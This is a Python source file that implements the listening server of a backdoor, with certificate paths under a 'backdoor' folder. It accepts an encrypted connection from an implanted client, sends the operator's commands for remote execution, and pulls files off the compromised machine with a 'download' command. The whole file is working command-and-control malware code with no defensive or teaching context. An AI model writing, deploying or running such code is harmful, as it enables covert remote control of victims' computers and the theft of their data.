import socket
import os
import sys
import ssl


HOST = "0.0.0.0"
PORT = 2222

ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
ctx.load_cert_chain(certfile="C:/backdoor/certs/server.crt", keyfile="C:/backdoor/certs/server.key")
ctx.load_verify_locations("C:/backdoor/certs/client.crt")
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((HOST, PORT))
sock.listen(1)
print("listening for client...")
ssock, client_addr = sock.accept()
client_sock = ctx.wrap_socket(ssock, server_side=True)
head = client_sock.recv(1024).decode()
print("connecting to: ", head)

while True:
    try:
        cmd = input(f"enter command: ").encode()
        if cmd.decode().split(" ")[0] == "download":
            client_sock.send(cmd)
            path = cmd.decode().split(" ")[1]
            print(f"downloading {path}...")
            with open("copy" + path, "w") as fh:
                rdata = client_sock.recv(1024).decode()
                while True:
                    if rdata == "DONE":
                        break
                    fh.write(rdata)
                    rdata = client_sock.recv(1024).decode()
            print("...finished downloading")
        else:
            client_sock.send(cmd)
            data = client_sock.recv(1024).decode()
            if data in {"q", "quit", "Q", "Quit"}:
                print("terminating...")
                break
            while True:
                print(data)
                if len(data) < 1024:
                    break
                data = client_sock.recv(1024).decode() 
    except Exception as err:
        print(f"error: {err}...terminating")
        break
client_sock.shutdown(socket.SHUT_RDWR)
sock.close()